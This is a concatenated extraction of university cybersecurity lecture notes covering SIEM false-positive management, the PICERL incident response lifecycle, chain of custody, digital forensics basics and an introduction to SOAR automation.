Insights from User Entity and Behavioral Analytics (UEBA) tools and contextualized alert data can significantly reduce the number of false positives that occur in an enterprise environment. \nBest practices for effective security alert management [Excluded] \nReducing false positives is an ongoing process. Security leaders must commit resources to conducting regular reviews of alert investigations and look for opportunities to improve them. Analyzing false positives can help paint a picture of where the organization's security controls and policies fall short. \nHere are some things you can do to improve the management of security signals in your SIEM: \nDeploy custom detection rules. Customization helps security leaders improve alert quality by drawing information from real incidents and using it to contextualize malicious behavior when detected. \nUse behavior-based detection rules. UEBA-enhanced SIEMs distinguish between normal activities and cybersecurity threats based on user behaviors. This dramatically improves the organization's security posture and gives analysts fewer alerts per day to address. \nContextualize security alerts with data from other tools. Your Endpoint Detection and Response (EDR) or Network Detection and Response (NDR) may offer valuable perspective on a detected security event. That context can mean the difference between an accurate detection event and a false positive. \nImplement automation in incident response workflows. Security Orchestration, Automation, and Response (SOAR) technology helps consolidate security incident response and improve the effectiveness of security measures. \nAutomate SOC operations to improve investigation times. SOC automation solutions like Lumifi Shieldvision™ give analysts access to valuable contextual data on cybersecurity incidents in near real-time. Detect threat actor activity and respond to critical incidents with unlimited visibility into your environment while reducing false positives in security alerts. \nDealing with False Positives [Excluded]\nUnderstanding the concept of false positives, we conclude that they will be present in the routine of security operations and that this isn’t necessarily a problem. In a perfect world, we  want to collect data from all the company’s actives, but this would result in a higher volume of alerts and consequently a higher number of false positives. With constant management of the tools, we manage to find the “perfect point” in terms of the volume of alerts.\nIn the process of monitoring and detecting threats, there are two extremes:\nToo many alerts that will leave analysts overwhelmed and often failing to look at what is actually bringing risk to the business;\nToo few alerts (not even false positives) which may indicate that the environment is not being monitored correctly, as we may be blind to certain points. Examples of blind spots:\nLack of data sources, i.e. the necessary logs aren’t being collected;\nPoorly configured tools that don’t generate useful logs to be monitored;\nPoor management of exception lists, i.e. there’s a very permissive list that ends up classifying several situations as exceptions.\n\nThe ideal volume will depend on a number of factors such as the number of assets monitored, the number of security tools available, the number of data sources being monitored, among others. We need to understand that some of the alerts generated may be false positives, so we must learn from them and manage them so that they don’t affect the investigation of others.\nTools mentioned can generate false positives if they aren’t properly managed. \u000b[Excluded]\nVulnerability Scanner\nThis tool aims to identify vulnerabilities in company assets. There are various methods for validating whether a piece of equipment is vulnerable, such as checking the version of the installed package against the tool’s knowledge base.\nIDS (Intrusion Detection System) and IPS (Intrusion Prevention System)\nLike the other tools, these also work on the basis of signatures, but with the aim of identifying malicious traffic on the network. IDS only detects malicious patterns, while IPS can detect and block these communications, and it’s very common to create policies for environments and exceptions for network communications that generate false positive alerts.\nAntivirus\nAn antivirus tool can work in different ways, whether using a signature base, heuristics, observing behavior or even machine learning to detect malicious patterns, the solution manufacturer is responsible for managing and feeding this knowledge base to detect new threats.\nNowadays, companies need to develop applications to support their business processes and these can perform procedures on actives which are the same as those of a malware, such as creating new processes or executing commands to copy files. The antivirus tool won’t recognize that this is a legitimate application and will generate an alert.\nThe solution to this problem is to map the alerts generated by the tool and understand the standard and expected behavior of the application. After this, exception rules can be created so that new alerts aren’t generated.\n\nManaging False Positives [Excluded]\nA good threat monitoring and detection process needs to include monitoring through metrics (KPIs) of false positives\nKPI to track the rate of false positives over the course of the month: The result is expressed as a %. Below is an example of how to interpret this data:\n0% – 5%: normal and expected behavior for an average volume of 100,000 events per month (example);\n1% – 15%: false positives should be evaluated to understand the root cause, where processes and configurations should be adjusted;\ngreater than 15.1%: a systematic review of the processes and tools involved in the incident monitoring and response process is required.\nAs stated above, each environment will be made up of different technologies and monitoring processes, so the percentages specified above should be evaluated for the context of your process.\nWe can also establish other indicators to track these alerts, such as:\nPercentage of FP alerts per implemented rule: with this value we can identify which rules are generating the most false positives;\nPercentage of FP alerts per scenario: assessing whether the threat scenario being monitored makes sense for the business;\nTotal hours spent on FP analysis: we can identify the cost generated by hours dedicated to dealing with false positives;\nNumber of alerts categorized as FP but which ended up generating an incident: this is part of the continuous improvement process, where we must learn from the operational mistakes made.\nIn cybersecurity incident response, false positives and false negatives can significantly impact the effectiveness of security measures. \nHere are examples of each:\nFalse Positives\nMalware Alerts:\nA legitimate software application is flagged as malware by an antivirus program because it uses behavior similar to known malware (e.g., accessing certain system files).\nNetwork Traffic:\nAn alert triggers for suspicious network traffic when a legitimate software update runs, causing a large volume of outbound connections that mimic a data exfiltration pattern.\nUser Behavior:\nA security system flags an employee for unusual login behavior when they access their account from a new location after traveling, mistakenly identifying it as a potential account compromise.\nConfiguration Changes:\nA change in system configuration, such as a scheduled maintenance update, triggers an alert for unauthorized access or modifications, even though it was planned and approved.\nFalse Negatives\n\nUndetected Malware:\nA new strain of malware bypasses signature-based detection systems, allowing it to operate undetected within the network while causing damage or data theft.\n\nInsider Threats:\nA disgruntled employee engages in unauthorized access to sensitive data, but their behavior falls within normal patterns that do not trigger any alerts, resulting in undetected malicious activity.\n\nPhishing Attacks:\nAn employee falls for a sophisticated phishing email that is not recognized as malicious by email filters, leading to credential theft without any alerts being generate\n\nLateral Movement:\nAn attacker successfully moves laterally within the network without raising any alarms, exploiting trusted relationships between systems that security measures fail to monitor.\n\nImportance in Incident Response\nFalse Positives lead to alert fatigue, where security teams might overlook genuine threats due to the overwhelming number of alerts.\nFalse Negatives pose a significant risk as they can allow real threats to go undetected, potentially resulting in data breaches or system compromises.\nEffective incident response involves refining detection methods to minimize both false positives and false negatives, ensuring that security teams can focus on real threats and respond efficiently.\nReferences \n•ITIL Incident Management Priority Matrix\n•ITIL Incident Management Priority Matrix (buildahelpdesk.com)\n•Cyber Kill Chain\n•https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html\n•Lockheed Martin. (2022). Cyber Kill Chain. https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html \n•Security Incidents: Types of Attacks and Triage Options\n•Categorize Information Security Incident Types by Getting Inside the Mind of the Attacker\n•https://cybersecurity.att.com/resource-center/ebook/insider-guide-to-incident-response/types-of-security-incidents\nExamples of Triage Cybersecurity Incidents\nCyber Security Triage: Learn the Essentials | CCS Learning Academy\n\nAcknowledgement : content taken from\nSecurity Operations Center Guidebook\nA Practical Guide for a Successful SOC\nGregory Jarpey and R. Scott McCoy\n\nChapter 5 and 6\nhttps://www.ccslearningacademy.com/what-is-triage-in-cyber-security/\n\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Security Operations Centers (SOCs)\\Spring 25 - Lecture 4  -Incident Response and Investigation.pptx": "Lecture/Topic 4 \nIncident Response and Investigation\nCSSY4103 - Security Operations Centre (SOC)\n\nIncident Response and Investigation: \nIncident response lifecycle: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned (PICERL) \nIncident handling procedures for different types of threats \nChain of custody and evidence preservation \nDigital forensics basics for SOC personnel\nObjectives\nAfter studying this chapter, you should be able to: \nUnderstand the incident response lifecycle (PICERL) to effectively prepare for identify, contain, eradicate, recover from, and learn from security incidents.\nDevelop a comprehensive understanding of incident handling procedures tailored to various types of cybersecurity threats, including malware infections, data breaches, and insider threats.\nLearn the importance of maintaining a secure chain of custody and implementing proper evidence preservation techniques to ensure the integrity and admissibility of digital evidence in legal proceedings.\nGain foundational knowledge in digital forensics to support incident response efforts, including evidence collection, analysis, and documentation, enabling SOC personnel to effectively contribute to investigations and enhance organizational security posture.\n\n\n\n\n\nIncident response lifecycle: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned (PICERL) \u000b\nIncident Response\nIncident response is a systematic procedure that enables organizations to identify, prioritize, restrict, and eliminate cyberattacks. \nThe objective of incident response is to guarantee that companies are promptly informed of important security occurrences and take immediate steps to halt the attacker, mitigate the resulting harm, and prevent more attacks or similar incidents from occurring in the future.\n\nIncident Response Frameworks\nIncident response (IR) frameworks provide a structured approach for dealing with cybersecurity threats and breaches. \nIn a SOC, these frameworks ensure that incidents are managed effectively and consistently, minimizing damage and aiding in swift recovery. \nSeveral established frameworks offer guidance on how to detect, contain, and respond to security incidents.\nNIST Incident Response Framework (NIST 800-61)\nSANS Incident Response Process\nISO/IEC 27035 Incident Management\u000b\nIncident Response Frameworks [Excluded]\nNIST 800-61\nTitle: Computer Security Incident Handling Guide\nPublisher: National Institute of Standards and Technology (NIST)\nFocus: Provides guidelines for incident handling to ensure effective management of cybersecurity incidents in organizations.\nPurpose: Aims to help organizations prepare for, detect, analyze, and respond to incidents, ensuring lessons learned are incorporated into future incident handling.\n\nIncident Response Frameworks [Excluded]  \nSANS Incident Response\nTitle: SANS Institute Incident Response Process\nPublisher: SANS Institute\nFocus: Offers a comprehensive process for responding to cybersecurity incidents based on practical experiences and training.\nPurpose: Provides a clear, actionable framework for organizations to follow when handling incidents, emphasizing the importance of preparation and learning from past incidents.\n\nIncident Response Frameworks [Excluded] \nISO/IEC 27035\nTitle: Information Security Incident Management\nPublisher: International Organization for Standardization (ISO) and International Electrotechnical Commission (IEC)\nFocus: A standard for managing information security incidents, applicable to any organization, regardless of size or type.\nPurpose: Establishes guidelines for incident management processes to help organizations prepare for, detect, respond to, and recover from incidents effectively.\n\nStrengths and Limitations [Excluded]\nIncident response lifecycle\nThe PICERL framework, which stands for Preparation, Identification, Containment, Eradication, Recovery, and Lessons Learned, was proposed by the SANS Institute. \nThe framework is designed to provide a structured approach to incident response, emphasizing the need for thorough preparation and post-incident analysis\n\nIncident response lifecycle\nPICERL stands for Preparation, Identification, Containment, Eradication, Recovery, and Lessons Learned.\nIt is a framework for handling cybersecurity incidents, guiding teams through the stages of identifying and responding to threats.\nEach phase of the PICERL process serves a critical function in addressing and recovering from cybersecurity incidents.\nPICERL | Preparation\nIdentifying potential vulnerabilities in an organization's security posture and developing a plan to address them. \nThis phase involves getting ready before any incident occurs. It focuses on establishing policies, procedures, and tools to handle incidents efficiently. \nKey activities include:\nDeveloping and testing an incident response plan.\nSetting up security measures such as firewalls, IDS, and others.\nTraining staff to recognize and respond to security threats.\nDefining roles and responsibilities for the incident response team.\nGoal: Build a solid foundation for identifying and responding to incidents quickly and effectively.\nPICERL | Identification\nIdentifying the nature of the security incident and determining its potential impact on the organization. \nIn this phase, the organization focuses on detecting and verifying potential security incidents. This includes monitoring systems, reviewing alerts, and analyzing suspicious activity to determine whether a real threat is present. \nCommon tasks include:\nReviewing logs from security tools (e.g., IDS/IPS, SIEM).\nMonitoring network traffic and user activity.\nAnalyzing anomalies or suspicious events.\nIdentifying indicators of compromise (IoCs).\nGoal: Detect security incidents early to limit potential damage.\nPICERL | Containment\nExecution of steps to prevent the security incident from spreading further or causing more harm. \nOnce an incident is confirmed, the next step is to contain the threat to prevent further harm. \nContainment strategies are divided into:\nShort-term containment: Immediate actions to prevent further damage, such as isolating compromised systems.\nLong-term containment: Implementing measures that will remain in place while planning for complete eradication.\nGoal: Stop the spread of the attack while keeping critical systems operational.\n\nPICERL | Eradication\nExecuting steps to remove the root cause of the security incident and prevent it from occurring again in the future. \nIn this phase, the focus shifts to eliminating the root cause of the incident. May involves removing malware, closing exploited vulnerabilities, or disabling compromised accounts. \nKey tasks include:\nCleaning infected systems (e.g., removing malware).Patching vulnerabilities or flaws exploited by attackers.\nStrengthening defenses to prevent re-entry.\nVerifying that no remaining threats (backdoors, hidden malware) exist.\nGoal: Fully remove the attacker’s presence and prevent re-infection.\nPICERL | Recovery\nPerforming steps to restore affected systems or data and ensure that the organization can continue to function normally. \nAfter eradicating the threat, the organization works to restore normal operations while ensuring that systems are functioning correctly. \nKey tasks include:\nRestoring data from backups.\nBringing systems back online safely.\nMonitoring restored systems for any signs of abnormal activity.\nConfirming that security issues have been fully resolved.\nGoal: Safely return systems to normal operations without reintroducing the attack.\nPICERL | Lessons Learned\nDocumenting what was learned from the security incident and how it can be applied to prevent similar incidents in the future. \nOnce the incident has been fully resolved, it’s important to review the entire process and identify areas for improvement. \nKey tasks include:\nConducting a post-incident analysis to assess what went wrong and what worked well.\nUpdating the incident response plan based on the experience.\nProviding additional training or resources to the team if necessary.\nDocumenting the entire incident and response process.\nGoal: Improve the organization’s incident response plan and strengthen security for future incidents.\nIncident Response and Investigation:  \nIncident handling procedures for different types of threats \n\n\u000b\u000bIncident handling procedures for different types of threats\u000bSecurity incident handling procedures vary depending on the type of threat faced. Here are some general guidelines for handling different types of security threats:\u000b\u000b\nMalware Infections:\nIsolate the infected system from the network to prevent further spread.\nIdentify the type and source of the malware.\nUse antivirus software to scan and remove the malware if possible.\nUpdate antivirus signatures and apply patches to vulnerable systems.\nRestore affected systems from clean backups if necessary.\nConduct a thorough investigation to determine the extent of the infection and any data breaches.\n\n2. Unauthorized Access (e.g., hacking, insider threats):\nImmediately revoke access privileges for the compromised account or system.\nChange passwords and access credentials for affected accounts.\nPreserve evidence by logging relevant information and activities.\nInvestigate the source of the unauthorized access and assess the damage.\nImplement additional security measures such as two-factor authentication.\nPatch vulnerabilities and update security configurations to prevent future breaches.\n\u000b\u000bIncident handling procedures for different types of threats\u000b\u000b\n3. Denial-of-Service (DoS) Attacks:\nMitigate the impact of the attack by filtering or blocking malicious traffic.\nMonitor network traffic and system performance to identify the source of the attack.\nNotify internet service providers (ISPs) or relevant authorities if necessary.\nImplement DoS protection mechanisms such as rate limiting and traffic shaping.\nConsider deploying redundancy and failover mechanisms to maintain service availability.\n4. Data Breaches:\nNotify affected individuals and regulatory authorities as required by law.\nContain the breach and limit further exposure of sensitive data.\nPreserve evidence for forensic analysis and legal purposes.\nConduct a comprehensive investigation to determine the cause and scope of the breach.\nImplement remediation measures such as encryption, access controls, and monitoring.\nReview and update security policies and procedures to prevent similar incidents in the future.\n\n\u000b\u000bIncident handling procedures for different types of threats\u000b\u000b\n5. Social Engineering Attacks:\nEducate employees about common social engineering tactics and how to recognize them.\nEstablish clear procedures for verifying the identity of individuals requesting sensitive information or access.\nMonitor and review user activities for suspicious behavior.\nReport social engineering attempts to relevant security teams or authorities.\nImplement controls such as employee awareness training and multi-factor authentication.\n\n6. Physical Security Breaches:\nSecure the affected area and restrict access to authorized personnel only.\nReview surveillance footage and access logs to identify individuals involved.\nNotify security and law enforcement agencies if necessary.\nConduct a security assessment to identify weaknesses in physical security measures.\nImplement corrective actions such as installing additional locks or security cameras\nIncident Response and Investigation: \nChain of custody and evidence preservation \n\nChain of custody and evidence preservation \nWhat is the chain of custody in computer forensics?\nThe chain of custody in digital forensics can also be referred to as the forensic link, the paper trail, or the chronological documentation of electronic evidence. It indicates the collection, sequence of control, transfer, and analysis.\nWhy is it important to maintain the chain of custody? \nIt is important to maintain the chain of custody to preserve the integrity of the evidence and prevent it from contamination, which can alter the state of the evidence. If not preserved, the evidence presented in court might be challenged and ruled inadmissible.\n\nWhat is the procedure to establish the chain of custody?\nSave the original materials: You should always work on copies of the digital evidence as opposed to the original.\nTake photos of physical evidence:  Photos of physical (electronic) evidence establish the chain of custody and make it more authentic.\nTake screenshots of digital evidence content: In cases where the evidence is intangible, taking screenshots is an effective way of establishing the chain of custody.\nDocument date, time, and any other information of receipt: Recording the timestamps of whoever has had the evidence allows investigators to build a reliable timeline of where the evidence was prior to being obtained\nInject a bit-for-bit clone of digital evidence content into our forensic computers: This ensures that we obtain a complete duplicate of the digital evidence in question.\nPerform a hash test analysis to further authenticate the working clone: Performing a hash test ensures that the data we obtain from the previous bit-by-bit copy procedure is not corrupt and reflects the true nature of the original evidence. \n\nDigital forensics Chain of custody and evidence preservation  \nWhat are the Steps in the Chain of Custody in Cyber Security? \n\tPreserving the asset or evidence of an organization requires the chain of custody to start from the collection of that evidence, its analysis, reporting, and till it’s presented in court.\n\n\nDigital forensics Chain of custody and evidence preservation\n1.Data Collection\nAfter an incident, the chain of custody starts from the collection of evidence and its state. Each acquired piece of evidence is to be labeled with its source, the time of its collection, where it is stored, and who has access to it. All of this is documented to preserve the integrity of the evidence. \n2. Examination\nThe examination of the captured evidence carried out by the digital forensics team is then documented precisely. This includes taking notes of the complete process, who examined it, and the evidence uncovered. \n\n3.  Analysis  \nThe collected evidence is then transferred for analysis, and again, each step of the analysis is recorded. Analysts use digital forensics tools to reconstruct the background of the evidence and draw unbiased conclusions, which are documented.  \n4. Reporting  \nThe final stage is to report the findings to the court in a professional digital forensics report, following standards set by organizations such as the National Institute of Standards and Technology (NIST). The report covers key aspects of the chain of custody, which include: the tools used to collect and process the evidence, the chain of custody statement, a list of the data sources, identified issues and vulnerabilities, and the next possible steps to take. All of this adds to the authenticity and viability of the evidence and makes it presentable to the court.\n\n\nIncident Response and Investigation: \nDigital forensics basics for SOC personnel\nDigital forensics basics for SOC personnel\nDefinition of Digital Forensics:\t\nDigital forensics is the process of uncovering and interpreting electronic data. The goal of the process is to preserve any evidence in its most original form while performing a structured investigation by collecting, identifying, and validating the digital information to reconstruct past events. The context is most often for the usage of data in a court of law, though digital forensics can be used in other instances.”\nSteps of Digital Forensics:\nIdentification: First, find the evidence, noting where it is stored.\nPreservation: Next, isolate, secure, and preserve the data. This includes preventing people from possibly tampering with the evidence.\n Analysis: Next, reconstruct fragments of data and draw conclusions based on the evidence found.\nDocumentation: Following that, create a record of all the data to recreate the crime scene\nPresentation: Lastly, summarize and draw a conclusion.\n\nDigital Forensics Role in SOC\nIn the context of a Security Operations Center (SOC), digital forensics plays a critical role in incident response, helping organizations identify, manage, and learn from security incidents.\nThe integration of digital forensics into SOC operations is essential for effective incident management.\nBy aligning with the SANS PICERL framework, digital forensics teams enhance the organization's ability to respond to threats and improve its overall security posture.\n\nDigital Forensics Role in SOC [Excluded]\nPreparation\nTool Selection and Configuration: Digital forensics teams in a SOC are responsible for selecting and configuring forensic tools that will be used to collect, preserve, and analyze evidence from systems during incidents.\nTraining and Awareness: They provide training to SOC analysts and incident response teams on the importance of digital forensics and how to recognize incidents that may require forensic analysis.\nDocumentation and Processes: Establishing standard operating procedures (SOPs) for evidence handling, chain of custody, and forensic analysis to ensure consistency and legal compliance.\n\nDigital Forensics Role in SOC [Excluded]\nIdentification\nIncident Detection: Forensics teams assist in the identification of potential security incidents by analyzing alerts, logs, and network traffic for suspicious activities.\nEvidence Collection: They guide the initial responders on what data and systems to capture for further analysis, ensuring that the right evidence is collected without compromising its integrity.\n\nDigital Forensics Role in SOC [Excluded] \nContainment\nIsolating Affected Systems: The forensics team advises on how to safely isolate affected systems to prevent further damage while preserving evidence for analysis.\nData Preservation: They ensure that all data relevant to the incident is preserved properly, including memory captures, disk images, and logs, to maintain the integrity of the evidence.\n\nDigital Forensics Role in SOC [Excluded]\nEradication\nAnalysis of Evidence: Forensics analysts conduct detailed examinations of collected evidence to identify the root cause of the incident, including malware analysis, file analysis, and network traffic analysis.\nDocumentation: They document their findings and methodologies clearly for future reference, including any identified vulnerabilities or weaknesses exploited during the attack.\n\nDigital Forensics Role in SOC [Excluded]\nRecovery\nRestoration of Systems: The digital forensics team may be involved in the recovery process by advising on system restoration, ensuring that all malicious artifacts are removed, and systems are securely configured.\nValidation of System Integrity: They conduct checks to ensure that the recovered systems are clean and that no backdoors or vulnerabilities remain.\n\nDigital Forensics Role in SOC [Excluded]\nLessons Learned\nPost-Incident Review: Forensics professionals participate in the post-incident review to analyze the effectiveness of the response and the forensic processes used.\nImproving Processes: They provide recommendations for improvements in incident response, detection capabilities, and forensic analysis processes to enhance the overall security posture of the organization.\nReporting: Creation of detailed reports that summarize the incident, forensic findings, and lessons learned, which can be used for training and future reference.\n\nStudent Self Study!\nDownload The Incident Handlers Handbook from here (https://sansorg.egnyte.com/dl/6Btqoa63at) and \nFamiliarize your self with the Incident Handlers Checklist (pp 11)\nUnderstand how anomalies are identified in Window OS  (Section 9) and Linux OS (Section 10) and what indicators point can be collected.\nStudent Activity\nConsider the following scenario \nA mid-sized financial services company experienced a cybersecurity incident when a phishing email successfully led to a malware infection on several employee workstations. \nThe Security Operations Center (SOC) is tasked with managing this incident by applying the SANS PICERL framework to ensure a structured and effective response.\n\nDiscuss and answer the following questions [next slide]\n\n\nPhase-wise questions (1/2)\nPreparation:\n1. Describe the steps that the SOC should take in advance to prepare for potential incidents. \nIdentification:\n2. What tools and methods would be used to identify the malware infection?\n3. Outline the specific indicators of compromise (IoCs) the SOC analysts should look for in this scenario.\nContainment:\n4. Identify both short-term and long-term containment measures the SOC could implement once the incident is confirmed.\n5. Discuss the importance of isolating affected systems and what actions should be taken to prevent further spread of the malware.\nPhase-wise questions (2/2)\nEradication:\n6. Explain the actions the SOC should take to remove the malware from infected systems. Include steps for addressing vulnerabilities that allowed the incident to occur.\n7. Discuss the role of forensic analysis in this phase and what information should be gathered.\nRecovery:\n8. Outline the steps the SOC should follow to restore normal operations after the incident. How can the SOC ensure that the systems are secure before reconnecting them to the network?\nLessons Learned:\n9. Discuss the importance of conducting a post-incident review.\nANSWERS- Sample\n1. Describe the steps that the SOC should take in advance to prepare for potential incidents. \nBefore the incident, the SOC took the following practical actions:\nSecurity Policy Development: Established comprehensive policies regarding acceptable use, incident reporting, and security awareness.\nTraining and Awareness Programs: Conducted regular training sessions for employees to recognize phishing attempts and other social engineering tactics. These sessions included simulated phishing emails to test employee awareness.\nTool Deployment: Implemented security tools, including:\nAnti-virus and anti-malware solutions across all workstations.\nFirewalls and intrusion detection systems (IDS) to monitor network traffic.\nSecurity information and event management (SIEM) systems for real-time alerting and monitoring.\nIncident Response Plan: Developed a documented incident response plan outlining roles, responsibilities, and procedures, ensuring that all team members knew their tasks in the event of an incident.\n2. What tools and methods would be used to identify the malware infection?\nUpon noticing unusual network activity, the SOC analysts performed the following steps to identify the incident:\nAlert Monitoring: Used the SIEM system to monitor for alerts indicating unusual behavior, such as increased outbound traffic from specific workstations.\nLog Analysis: Analyzed email logs and security event logs to trace the origin of the attack. They identified the phishing email and tracked the malware's entry point.\nUser Reports: Collected reports from employees who noticed suspicious activity on their systems, confirming the existence of the malware\n\n3. Outline the specific indicators of compromise (IoCs) the SOC analysts should look for in this scenario.\nIndicators of Compromise (IoCs):\nUnusual outbound network traffic patterns.\nPresence of known malicious IP addresses or domains in logs.\nReports from employees about suspicious emails or system behaviors.\nUnexpected changes to files or processes on affected workstations.\n\nExample of unusual outbound network traffic patterns\nExample of known malicious IP addresses \n4. Identify both short-term and long-term containment measures the SOC could implement once the incident is confirmed.\nShort-Term Containment Measures:\nImmediately isolate affected workstations from the network by disabling their network connections to prevent the spread of malware.\nTemporarily suspend user accounts associated with infected systems to limit further access.\nLong-Term Containment Measures:\nDevelop temporary patches for affected systems to restrict access while a more permanent solution is being implemented.\nReview and adjust firewall rules and access controls to further limit exposure.\nSource of image: dreamstime.com\n5. Discuss the importance of isolating affected systems and what actions should be taken to prevent further spread of the malware.\nIsolating affected systems during a cybersecurity incident is crucial for several reasons:\nPreventing Further Spread: The primary goal of isolating infected systems is to halt the malware's ability to propagate within the network. Once a system is compromised, malware can often spread to other connected devices or systems. Isolating the affected machines ensures that the threat does not escalate or affect additional assets​.\nMinimizing Damage: By containing the affected systems, organizations can minimize the potential damage that malware may cause. This includes preventing data loss, theft, or corruption. Isolated systems can be assessed and remediated without risking critical business operations​.\nFacilitating Forensic Investigation: Isolating affected systems allows incident response teams to conduct a forensic investigation without interference. This is essential for identifying the root cause of the incident, understanding how the malware entered the environment, and developing strategies to prevent future occurrences.\nMaintaining Business Continuity: By isolating infected systems, organizations can continue to operate unaffected parts of their infrastructure. This containment strategy helps maintain essential services while the incident is being managed​.\n6. Explain the actions the SOC should take to remove the malware from infected systems.\nWhen a Security Operations Center (SOC) identifies a malware infection on systems, several critical actions should be taken to effectively eradicate the threat. These actions can be categorized into several key phases:\nPhase 1: Initial Assessment and Containment:\nAssess the Extent of Infection: The SOC should quickly determine the scope of the malware infection, identifying which systems are affected and the type of malware involved. This assessment helps prioritize remediation efforts .\nContain Affected Systems: Before proceeding with removal, it is essential to isolate the infected systems from the network to prevent further spread of the malware, as previously discussed .\n\nSource of image: pinclipart.com\n6. Explain the actions the SOC should take to remove the malware from infected systems.\nPhase 2: Malware Identification:\nUse Threat Intelligence: Utilize threat intelligence resources to gather information on the specific malware variant involved in the incident. This can include identifying known signatures and behavior patterns associated with the malware .\nRun Scans with Updated Security Tools: Conduct comprehensive scans using reputable anti-virus and anti-malware software. It is critical to ensure that these tools are updated to recognize the latest threats.\nPhase 3: Malware Removal:\nQuarantine and Delete: Once the malware is identified, the SOC should quarantine the affected files and applications. Most modern anti-malware tools provide options to isolate or delete detected threats safely .\nManual Removal (if necessary): In some cases, particularly with sophisticated or rootkit malware, automated tools may not be sufficient. The SOC may need to manually remove malware components, including registry entries or malicious files, while ensuring that system integrity is maintained.\n\n7. Discuss the role of forensic analysis in this phase and what information should be gathered.\nForensic analysis helps identify the root cause of the incident, providing insights into how the attack occurred and guiding future prevention strategies.\nForensic analysis allows incident responders to thoroughly examine the malware, identifying its various components and methods of operation. Understanding the complete structure and functionality of the malware is crucial for effectively removing it without leaving remnants that could lead to a re-infection​(\nMany malware strains employ techniques to persist across reboots or re-installations. Forensic analysis can uncover these persistence mechanisms—such as modified registry entries, scheduled tasks, or startup programs—ensuring that all methods of reinfection are identified and eliminated.\nThe evidence collected during forensic analysis may be required for legal or compliance reasons. Proper documentation of findings helps organizations meet regulatory obligations and can support legal action against perpetrators.\n8. Outline the steps the SOC should follow to restore normal operations after the incident. \nSteps for System Restoration:\nClean and rebuild affected workstations using secure images to ensure no remnants of the malware remain.\nApply security patches and updates to all systems before reconnecting them to the network.\nEnsuring Security Before Reconnection:\nConduct thorough testing to verify that systems are functioning correctly and securely.\nMonitor affected systems closely after recovery to detect any signs of residual malware or potential threats.\n9. Discuss the importance of conducting a post-incident review. \nLearning from Experience: The \"Lessons Learned\" phase helps the SOC capture insights on response effectiveness and gaps, improving defenses against future attacks.\nIdentifying Weaknesses: The review identifies system and process vulnerabilities, guiding the prioritization of patches, updates, and security investments.\nImproving Incident Response Procedures: It evaluates the effectiveness of the response plan, team coordination, and decision-making during the incident.\nDocumentation for Compliance: The review ensures proper documentation, meeting compliance requirements and aiding audits or legal processes.\nStrengthening Team Competency: It assesses team performance, identifying areas for improvement and targeting future training efforts.\nReferences\nAnatoly Tykushin, and Svetlana Ostrovskaya. Incident Response for Windows. Packt Publishing Ltd, 23 Aug. 2024.\nAnson, Steve. Applied Incident Response. Indianapolis, Indiana, Wiley, 2020.\nBautista, Wilson. PRACTICAL CYBER INTELLIGENCE : How Action-Based Intelligence Can Be an Effective Response to Incidents;How Action-Based Intelligence Can Be An. Packt Publishing, 2018.\nHathaway, Melissa E. Best Practices in Computer Network Defense : Incident Detection and Response. Amsterdam ; Berlin ; Tokyo ; Washington, Dc, Ios Press, 2014.\nJohansen, Gerard. Digital Forensics and Incident Response. Packt Publishing Ltd, 16 Dec. 2022.\nhttps://www.halkynconsulting.co.uk/a/tag/incident-response/\nComputer Security Incident Handling Guide\nhttps://reciprocity.com/blog/common-types-of-security-incidents-and-how-to-handle-them/\nhttps://www.eccouncil.org/cybersecurity-exchange/computer-forensics/what-is-digital-forensics/\nhttps://resources.infosecinstitute.com/topics/digital-forensics/computer-forensics-chain-custody/\n\n\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Security Operations Centers (SOCs)\\Spring Lecture 6  Automation and Orchestration (SOAR).pptx": "Lecture 6:\nAutomation and Orchestration\nObjectives\nAfter studying this chapter, you should be able to\nWhat is SOAR?\nUnderstand different aspects of SOAR\n Why an investigation is essential?\nExplore common use cases for SOAR\nBenefits and challenges of orchestration\n\nWhat is SOAR ?\u000b\u000bSecurity Orchestration, Automation, and Response\u000b\nIt’s a cybersecurity approach that uses automation and coordination to quickly and effectively respond to and manage security incidents.\nSOAR is a stack of compatible software programs that enables an organization to collect data about cybersecurity threats and respond to security events with little or no human assistance. \nThe goal of using a SOAR platform is to improve the efficiency of physical and digital security operations.\nAspects of SOAR\nSecurity Orchestration:\nThis encompasses arranging and ordering different security tasks across diverse tools and technologies. For instance, when a security issue arises, SOAR can automatically initiate a series of predefined actions across various security systems.\nAutomation:\nSOAR systems streamline routine and repetitive tasks that security teams would otherwise need to carry out manually. This covers activities such as collecting data, confirming incidents, and executing response measures.\nResponse:\nSOAR simplifies incident management by furnishing playbooks or workflows that direct security analysts through the necessary steps for examining and alleviating threats. These playbooks can be tailored to suit an organization’s specific requirements.\n\nSOAR Capabilities\nCertainly, here are six abilities of SOAR:\nWorkflow Orchestration: SOAR arranges and sequences tasks across different security tools, ensuring that actions happen logically and in a coordinated manner when responding to incidents.\nAutomating Routine Activities: SOAR automates repetitive and manual tasks, like collecting data, validating information, and executing responses. This lets human analysts focus on more strategic tasks.\nIncident Playbooks: SOAR provides both ready-made and adaptable playbooks that direct security analysts through step-by-step procedures for various incident types. This guarantees consistent and efficient responses.\nIntegration with Security Tools: SOAR smoothly blends with an array of security tools and systems, allowing seamless communication and information exchange among various components.\nThreat Intelligence Incorporation: SOAR can combine external threat intelligence feeds, enhancing incident data with real-time insights into emerging threats and vulnerabilities.\nAnalyzing and Reporting: Through data analytics, SOAR supplies insights that help organizations grasp patterns in incidents, assess response effectiveness, and understand their overall cybersecurity status, aiding well-informed decisions.\nElements of SOAR\nSOAR is a set of security features that helps organizations collaborate on incident investigation and automate certain actions that SOC analysts perform. \nAs the end goal with SOAR, we want to achieve a faster mean time to acknowledge (MTTA) and mean time to respond (MTTR). The MTTA and MTTR are the two most important measurements for a SOC.\nThe main elements of SOAR are as follows:\nIncident management\nInvestigation\nAutomation\nReporting\nTI and Threat and Vulnerability Management (TVM)\n\nSecurity Orchestration Terminology \nSecurity orchestration is a method of connecting disparate security technologies through standardized and automatable workflows that enables security teams to effectively carry out incident response and security operations. \nIf you study this definition carefully, a few terms jump out: \n» Security technologies \n» Workflows \n» Security teams\n\nSecurity Orchestration Terminology  \nWhile learning about security orchestration, keep in mind the following terms:\nSecurity automation: Security automation is the process of executing security tasks using machines instead of 